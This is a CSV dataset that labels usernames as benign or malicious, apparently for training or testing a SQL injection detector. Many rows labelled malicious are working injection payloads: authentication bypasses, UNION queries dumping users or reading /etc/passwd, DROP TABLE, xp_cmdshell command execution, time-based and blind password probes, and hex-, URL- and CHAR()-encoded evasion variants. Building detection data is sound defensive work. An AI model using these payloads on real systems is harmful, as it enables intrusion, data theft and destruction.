name,is_malicious
wclark,0
marquezleah,0
linda67,0
morganlindsay,0
owebb,0
paulamy,0
dbriggs,0
vwilliams,0
coryortiz,0
tammyibarra,0
kimberly86,0
' OR CHAR(49)=CHAR(49)--,1
amy42,0
nancy03,0
rebeccapark,0
jacksonsara,0
wilsonjulia,0
xmiranda,0
jeffrey44,0
rubenjohnson,0
frederickjennifer,0
dianesantos,0
david74,0
whorton,0
santiagodylan' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
juarezseth,0
bcole,0
davidwebb,0
brianna93,0
lamlance,0
jennifer96,0
igarcia,0
navarromichael,0
sampsonbrandon,0
andres11,0
caleb92,0
kelly05,0
"joneschristopher'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
vkim,0
nguyenkelly,0
'; DROP TABLE users--,1
vaughnmikayla,0
wilcoxscott,0
'%27%20OR%201=1--,1
dsingleton,0
jamesgentry,0
wthomas' OR BINARY 'a'='a'--,1
stephaniecraig,0
billyleblanc,0
michaelrogers,0
isloan,0
jeffreyellis,0
zachary67,0
lauraparker,0
0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
bdorsey,0
kyle91,0
richardflores,0
bcooper,0
michael28,0
juanhernandez,0
troygriffith,0
virginiathomas,0
kennedytanya,0
johnsoneric,0
ericataylor,0
whitneychen,0
jean83,0
brownabigail' OR 1=1--,1
dliu,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
' OR 1=1--,1
petergreene,0
opowell,0
brian45,0
josephhale,0
vincentsmith,0
jacksonnicholas,0
sandravillanueva,0
vanessarodriguez,0
josepayne,0
cynthiaflores,0
kayla56,0
lori36,0
cynthialittle,0
hernandezlori,0
ybenjamin,0
sheliaparker,0
sophiaherman,0
christophersolis,0
kristin78,0
williamsjose,0
kjackson,0
smithjessica,0
julia37,0
jamesrobinson,0
jamie04,0
jacquelinecooley,0
deborahsmith,0
perezjessica,0
xdiaz,0
moralesrandy,0
joecarroll,0
wolfeteresa' OR SOUNDEX('test')=SOUNDEX('test')--,1
xmack,0
hparker,0
lauren32,0
ajones,0
charleschavez,0
rodriguezantonio,0
mbennett,0
robertstanley,0
sgarrett,0
gliu,0
matthewsbrian,0
craigwilliams,0
seanwood,0
hardinmatthew,0
erica18,0
stacyjackson0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
devinfarmer,0
bbush,0
vanessa28,0
ashleycannon,0
megan56,0
dhansen,0
ncarroll0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
rojasnicholas,0
chad00,0
'; DROP TABLE users--,1
iharrison,0
millercolleen' UNION SELECT * FROM users--,1
ipeterson,0
alex50,0
sherrysanchez,0
brandon00,0
mchase,0
meredithbecker,0
katherineriley,0
nmartinez,0
frichardson,0
pfarley,0
tuckereric,0
carrollmark,0
josephcherry'%20OR%201=1--,1
monica24,0
nicolekemp,0
'||'1'='1,1
crosbyjerry' OR SOUNDEX('test')=SOUNDEX('test')--,1
swansondrew,0
daviddennis,0
amberhicks'||'1'='1,1
haley20,0
foxgeoffrey,0
mstokes,0
qcruz,0
harrislinda,0
yolanda21,0
mcbridekelsey,0
theresathompson,0
brookelopez,0
hdalton,0
'; DROP TABLE users--,1
gbaldwin,0
foxstephanie,0
griffinjames,0
john88,0
tfoster,0
todd33,0
andrew35,0
hsalinas,0
' OR BINARY 'a'='a'--,1
unicholson,0
lauren41,0
james99,0
wrightbarbara,0
cheyenne55,0
blaketimothy,0
holdentammie,0
cmartinez,0
shanehess,0
ryan30,0
elizabethphelps,0
brownalexandra,0
alexandraclements,0
ramseyshelby,0
rduncan,0
nicholaswebb,0
rjohnson,0
timothy05,0
joyrussell,0
alejandrobolton,0
alison17CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
melanie31,0
morganbrittany,0
' OR 0x50=0x50--,1
hwu,0
james49,0
robinsonjerry,0
edwardmoran,0
erin81,0
scott12,0
tracy22,0
andersoncorey,0
bautistaroberto,0
sara98,0
jpatterson,0
jessica49,0
ralphallen,0
jesse54,0
oliviamccoy,0
angela34,0
james73,0
sdaniel,0
vdaniels,0
jonathanwilliams,0
wanda74,0
ygarcia,0
jamesbaldwin,0
james72,0
veronicajohnson,0
christopher85,0
"jenniferreese'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
nicole54,0
jennifer49,0
jennifer94,0
danielle90,0
0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
brookehill,0
asmith' OR 0x50=0x50--,1
0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
kristisandoval,0
haroldcaldwell,0
lindahendrix,0
evanssamantha,0
xroberts,0
rfarley,0
curtispamela,0
kimandrea,0
smithkathryn,0
johnsonleonard,0
lauren81,0
michaelhaley,0
daniel58,0
kevinpena,0
robertevans,0
bjimenez,0
laurawhite,0
holdenjessica,0
josephmartinCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
pbaldwin,0
pmartinez,0
scox,0
evanskristen,0
estradachristine,0
johnsonjennifer,0
traviswilson,0
jessica81,0
'||'1'='1,1
bergkristen,0
evan32' UNION SELECT * FROM users--,1
cynthia48,0
anngilbert,0
jaclynsalinas,0
joanmoran,0
amberdrake,0
mccallconnie,0
slong,0
qramos,0
jhorton,0
uvelez,0
kenneth66,0
alisonmartin,0
daniel85,0
jwilson,0
solisjames,0
johnsonlucas,0
athompson,0
' OR 0x50=0x50--,1
michaelcaldwell,0
' OR CHAR(49)=CHAR(49)--,1
nguyenruben,0
villanuevastephen,0
zkim,0
millercarrie,0
melissa97,0
wmarks,0
vgill,0
michellemcgrath,0
samanthaburton,0
emorgan,0
diamond65,0
kenneth92,0
rlowery' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
amanda42,0
nparker,0
' OR 0x50=0x50--,1
olsonangelica,0
amanda24,0
ian42,0
mitchelltracey,0
jennifer08,0
lisawilliams,0
davidellis'; EXEC xp_cmdshell('dir')--,1
andrea08,0
craig54,0
ldavis,0
crobinson,0
danielle62,0
0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
sheashawn,0
epearson,0
joshuawilson' OR BINARY 'a'='a'--,1
miguel12,0
powellroy,0
browningmelissa,0
barbaramartin,0
zcross,0
urubio'%27%20OR%201=1--,1
whiteshannon,0
kristinwilliams,0
jacksonbrent,0
rachelmanning,0
claytonleach,0
diazrobert,0
david12%27 %4f%52 %31%3d%31--,1
rachel05,0
robert30,0
johnsonleah,0
powerscharles,0
garrettmartinez,0
%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
brad78,0
mistyjackson,0
smithteresa,0
ortizangela,0
hendersonjennifer,0
ftorres,0
christian83,0
jwilcox,0
preynolds,0
ntodd' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
amanda92,0
martinezglenda' OR SOUNDEX('test')=SOUNDEX('test')--,1
ronaldcohen,0
jennifermorales'%27%20OR%201=1--,1
eddie93,0
christine47,0
hponce,0
timothy67,0
hmccullough,0
hughesderek,0
walkerjoy,0
zschmidt,0
'; EXEC xp_cmdshell('dir')--,1
erika86,0
debra41,0
martinbryan,0
qmarks,0
markskinner,0
boonealyssa,0
mackenzie36,0
amy08,0
berryjulia,0
sharon60,0
jmendoza,0
antonio10,0
davismorgan,0
crystalgriffith,0
thompsonalexandra,0
villarachel,0
smiththomas,0
david90,0
piercelaura,0
leehernandez,0
shernandez,0
vancebrian,0
lauren80,0
austinskinner,0
sandyterrell,0
gomezjulie,0
baxterjessica,0
andrewshields,0
brent92,0
wlamb,0
"ellen94' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
elizabeth75,0
susanrobinson,0
"stephanie35' OR BENCHMARK(10000000,MD5(NOW()))--",1
jacksonmary,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
whitemonica,0
dowens,0
dianenelson,0
tuckerashley,0
brittney50,0
gwilliams,0
maldonadoanne,0
halekristi,0
terri91,0
bowerskristen,0
sanchezstacy,0
natalie71,0
elizabethtorres,0
charlessanders,0
stephensdesiree,0
"spencerashley' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
hernandezamanda0x270x200x4f0x520x200x300x780x350x300x3d0x300x780x350x300x2d0x2d,1
madisonreed0x270x7c0x7c0x270x310x270x3d0x270x31,1
bakeralan,0
qbrooks,0
johnstonvalerie,0
christopher20,0
sharonweaverCHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
akhan,0
oking,0
"thomasjennifer' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
griffindanielle,0
gouldchristian,0
danielmeyer,0
mark55,0
jesse73,0
conradrachel,0
millerbrett,0
monica72,0
molly59,0
briggsjason,0
coxbenjamin,0
ismith,0
cedwards,0
michaelsmith,0
eric55,0
qcox' OR 1=1--,1
pmiller,0
jeremiahhoward,0
carmen79,0
justinanderson,0
ashleyherrera,0
lclay,0
ewagner,0
roweanthony,0
jcordova' OR BINARY 'a'='a'--,1
chaddavis,0
stantontiffany,0
nathancolon,0
jennifer73,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
douglasamanda%27 %4f%52 %27%31%27%3d%27%31,1
henry91,0
marquezmichael,0
gscott,0
thernandez,0
katherine07,0
gkelly,0
jessica24,0
pearsonjohn,0
mfleming,0
fisherjanet,0
colleen89,0
wodonnell,0
umartin,0
daniellewilliams,0
opeterson,0
ycortez,0
christopherevans,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
kelsey45,0
zholmes,0
ryan52,0
davidjohnson,0
molly12,0
qdavis,0
rortega,0
xkelly,0
glenn57,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
ycook,0
jorosales,0
ibarraalexandra,0
espinozarobert,0
cruzthomas,0
kim41,0
garrettbrenda,0
nross,0
blakesusan,0
victoria42,0
dariusgreen,0
boltonclaire,0
kimberly11,0
fordamanda,0
austinjustin,0
roy20,0
rogersjose,0
scottsharon' OR '1'='1,1
scottewing,0
'||'1'='1,1
martha58' OR CHAR(49)=CHAR(49)--,1
parkkaren,0
rwelch%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
tramirez,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
ytownsend,0
morsetheresa,0
webbmichelle,0
ihouse,0
kevin12,0
kelseymccoy,0
hayskelly,0
lpeterson,0
coxjohn,0
'%20OR%201=1--,1
lspears,0
riveracrystal,0
rachel93,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
taylormary,0
tylermiller,0
cassandra83,0
joannawebster,0
maria24,0
matthew36,0
fergusonwilliam,0
cynthianorris,0
salazarteresa,0
elizabeth08,0
sarahquinn,0
donnamontoya,0
gmathews,0
villanuevabrian,0
ojordan,0
cnunez,0
norman23,0
jason04,0
nhunt,0
harriselizabeth,0
david44'%20OR%201=1--,1
psweeney,0
kmartin,0
juliegallagher,0
zbush,0
%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
mckeelinda,0
travisthompson,0
twalker,0
robinmurphy,0
swise,0
haleronald,0
garciaerin,0
davidreginald,0
hvaughnCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
coxamanda,0
gcollier,0
lindsey73,0
droberts,0
egonzalez,0
andreaperez'%20OR%201=1--,1
zmercado,0
dennis78,0
donna70,0
weissteresa,0
cstein,0
floydmichelle,0
brenda03,0
margaretjackson,0
hudsontyler,0
angelaflowers' OR BINARY 'a'='a'--,1
christina75,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
barrettdavid,0
reynoldsangela,0
michael44,0
brianbailey,0
"tsoto' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
lisa13,0
cmiller,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
nicolegallagher,0
jfrost,0
christineeaton,0
%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
'; EXEC xp_cmdshell('dir')--,1
eallen,0
erika10,0
matthew46,0
ramosglenn,0
pooledebra,0
johnsonbrett,0
emmaweeks,0
ediaz,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
fgreene,0
andrew97,0
philiproach,0
richardsonarthur,0
mariahchenCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
barrysandoval,0
lauramorris,0
hsmith,0
leah820x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
mendezsteven,0
williamhart,0
smorrison,0
'/**/OR/**/'1'='1,1
lcross,0
vasquezmichelle,0
george14,0
jdaniel,0
vcox,0
jasonwong,0
haletodd,0
claytonhopkins,0
jordanjohnston'; DROP TABLE users--,1
mollypatterson,0
feverett,0
'||'1'='1,1
brandonsosa,0
andreacarlson,0
robertjohnson,0
gloria88,0
vanessa18,0
karen11,0
corey21,0
kristina47,0
christopher68,0
donald37,0
gcollins,0
aperez,0
sanchezjenny,0
ryanmargaret,0
gilmoreshannon' OR CHAR(49)=CHAR(49)--,1
'; DROP TABLE users--,1
christopher79,0
ohorne,0
'||'1'='1,1
'%27%20OR%201=1--,1
douglas45' OR '1'='1,1
ealvarado' UNION SELECT * FROM users--,1
klindsey,0
williamgraves'; DROP TABLE users--,1
'%20OR%201=1--,1
jacksonrobert,0
dillongoodwin,0
johnsonjasmine,0
dianesmith,0
shawnlopez,0
sabrina33,0
brittney23,0
leslie39,0
regina41,0
gina20,0
davispeter,0
mccarthymelissa,0
anthony67,0
rnicholson' OR 1=1--,1
pmoreno,0
connie21,0
dhinton,0
gmarks,0
"amandamalone' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
stephenlynch,0
rojascindy,0
john18,0
dominguezcarol,0
angela36,0
kimberly19,0
alexandertravis,0
houstonchad,0
townsendtimothy,0
george51,0
ngreen,0
christopher17,0
kaylaclark,0
lori52'; EXEC xp_cmdshell('dir')--,1
harrisrita,0
shannon39,0
amyfoster,0
nicole51,0
tammyadams,0
fryewilliam,0
fosterbenjamin,0
stephen91,0
clarkdaniel,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
glogan' OR BINARY 'a'='a'--,1
richard65,0
stephanie67,0
vwhite,0
jwright,0
teresa87,0
rhopkins,0
stephanie25,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
gleblanc,0
ginawilson,0
walshveronica,0
sanderstimothy,0
michael96,0
' OR '1'='1,1
nperez,0
rossscott,0
elizabeth13,0
tiffanybarry,0
daniel64,0
walkeralison,0
danieljames,0
turnertracie,0
shaunclark,0
david14,0
cynthiadiaz,0
jessica20'; DROP TABLE users--,1
mosleychristopher,0
mike71,0
jason99,0
rogerslee,0
benjaminclark,0
stonematthew,0
barberspencer,0
prussell%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
macevedo,0
wolfephilip,0
gary91,0
smithlevi,0
curtisjesse,0
ashley01,0
hollandjennifer,0
jamiemiller,0
gregoryrobinson,0
leecooper,0
' OR CHAR(49)=CHAR(49)--,1
davisholly,0
vincentzimmerman,0
wallacejill,0
hawkinsjerry,0
lauragoodman,0
smithadam,0
ghayes,0
jonathon77,0
peggyjones,0
michaelchen,0
jennifer10%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
hmalone,0
jessicasmith,0
leonardchristopher,0
' UNION SELECT * FROM users--,1
' OR 1=1--,1
matthewmurphy,0
pyoung,0
nsmith,0
colleenpowell,0
kjenkins,0
jessica91,0
garciaalexis,0
rodriguezaaron,0
wolfejoshua,0
matthewgrant,0
hlandry,0
walkervicki,0
tjohnson,0
wmahoney,0
theresa92,0
courtney70CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
jeffreymathis,0
xbarnett,0
aguilarpaula,0
angela50,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
lucaserin,0
vrusso,0
perrydouglas,0
ezamora' OR 0x50=0x50--,1
rmckenzie,0
donald74,0
brendahoward,0
darlenerobinson,0
nancy70,0
melindarobles,0
ramirezchristopher,0
turnerheather,0
erogers,0
ijames,0
chavezsarah,0
myersgregory,0
michael24,0
robersonbrittany,0
josephdavis,0
brianfoster,0
glasskayla,0
mcdowellnathan,0
laurabarry,0
johnsonmichael,0
fcook,0
jdavis,0
xtorres,0
david59,0
herrerajennifer,0
ygonzalez,0
%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
usimmons,0
xberry' OR SOUNDEX('test')=SOUNDEX('test')--,1
frederickzhang'/**/OR/**/'1'='1,1
msandoval,0
lwilliams,0
jlopez,0
theresabarnett,0
craiggonzalez,0
michaelwilson,0
tweaver,0
beverlyweiss,0
ashleyrobinson,0
ramoscarrie,0
angela75,0
lauren60,0
tammylawrence,0
prestonkayla,0
fsmith' OR BINARY 'a'='a'--,1
dli,0
rebekah29,0
williamsamanda,0
donna54,0
aelliott,0
carlfrench,0
dale68,0
hutchinsoncourtney,0
nsnyder,0
kathy78,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
peter46,0
weissjamie,0
debra94,0
hodgesryan,0
courtney40,0
nathan26,0
spencerbrian,0
houstonjennifer,0
bfinley,0
john67,0
kjohnson,0
qspencer' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
josehoffman,0
shawn62,0
morrisjessica,0
kevinsheppard,0
nmitchell,0
savannah85,0
' OR '1'='1,1
0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
olambert,0
jason75' OR '1'='1,1
alexanderjennifer,0
monica52,0
tyler27' OR BINARY 'a'='a'--,1
harveyjeffrey,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
' OR SOUNDEX('test')=SOUNDEX('test')--,1
rhill,0
pamela50,0
yburns,0
christopher83,0
millerrobert,0
hhaynes,0
shelbyphillips,0
odean,0
schneiderheather,0
roachlori,0
rbaker,0
ruizjustin,0
watsonmelissa,0
weaveradrian,0
william95,0
matthewesparza,0
crosspatrick,0
pbryan,0
jason55,0
ejimenez,0
johnsonvictoria,0
hjohnson,0
davidsandoval,0
andersonmichael,0
anthony06,0
' OR BINARY 'a'='a'--,1
hyates,0
thomas00,0
stacey75,0
batesdavid,0
lauralowery,0
ingramjessica,0
dawsonlinda,0
hunterkristopher,0
' OR 1=1--,1
melissa30,0
jerry82,0
zachary38,0
eanderson,0
amber09,0
amber10,0
miranda66,0
lallen,0
kwoodard,0
%27 %4f%52 %31%3d%31--,1
mmurphy,0
carrie46,0
randychandler,0
aaronprice,0
myersshannon,0
benjamin83,0
johnsonamy,0
boyerrichard,0
parkjacob,0
pglover,0
heatherallen,0
alvarezmatthew,0
nwaters,0
brittanywilliams,0
bergererin,0
newtonglenn,0
silvamarissa,0
dfrost,0
gwright,0
riosmandy,0
'/**/OR/**/'1'='1,1
brandiedwards'; DROP TABLE users--,1
parkererica,0
brad02,0
susanjackson,0
wdavis,0
elizabeth98,0
durhamangela,0
fowlerelizabeth,0
kcarroll,0
nielsendylan,0
ryanmarks,0
ereese,0
dixonkara,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
chrisnolan,0
mzuniga,0
josephmorgan,0
mmoon,0
laurie56,0
abigail25,0
sabrinahart,0
ltanner' OR SOUNDEX('test')=SOUNDEX('test')--,1
isharp,0
johnpatrick,0
erichood,0
staceyfox,0
uflynn,0
ronald77,0
ortizjulie,0
fuenteserin,0
edwardsashley,0
kevinferrell,0
christopherritter,0
wagnerjackson,0
claytonmcbride,0
angela67,0
herickson,0
rfleming%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
"michaelsimmons'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
garciamatthew,0
kking,0
lsullivan,0
zachary86,0
rogerschristopher,0
moraloriCHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
sarah93,0
martineznicholas,0
wilkinsandrea,0
brownjesse,0
dnelson,0
alexiswhite,0
meghansparks,0
shannonwilson,0
stephenkim,0
youngmckenzie,0
whitewilliam,0
pricejohn,0
markcrawford,0
%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
peter81,0
christy18,0
youngbarbara,0
%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
kellyjohn,0
marioholland,0
olivia07,0
erica45,0
garciajason,0
anthonykemp,0
bgallegos,0
alexanderkelly,0
erin53,0
christinamartin,0
zreeves' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
williamsnicholas,0
meagancook,0
juliebaker,0
rebeccayoung' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
michael84,0
cmartinez,0
'%20OR%201=1--,1
bowersmark,0
garzawilliam,0
nancydiaz,0
jesse12,0
leslie85,0
ashley340x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
qlopez,0
ericarnold'%27%20OR%201=1--,1
christopherallen,0
hstokes,0
tiffanygilbert,0
leeeric,0
kwade,0
jbarrera,0
ksalinas,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
fdavis,0
michael64,0
timothy51,0
michaelramirez,0
apowell,0
qblackwell,0
' OR CHAR(49)=CHAR(49)--,1
annawilson,0
moranherbert,0
"harperricardo' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
stricklandmichele,0
' OR 0x50=0x50--,1
kanderson,0
bradshawcrystal,0
villachristian,0
fosterbrianna,0
riverachristopher,0
haleygregory,0
autumnramsey,0
andrewvang,0
george80,0
prios,0
juanmartinez,0
'%20OR%201=1--,1
nschneider,0
shelbyjones,0
emily73,0
heatherjenkins' OR SOUNDEX('test')=SOUNDEX('test')--,1
amyers,0
adkinsvincent,0
normamiller,0
christine95,0
jeffgonzalez,0
christopherharris,0
amandagilmore,0
wmiller,0
ehood'%27%20OR%201=1--,1
ernest56,0
christopher67,0
brownstephen,0
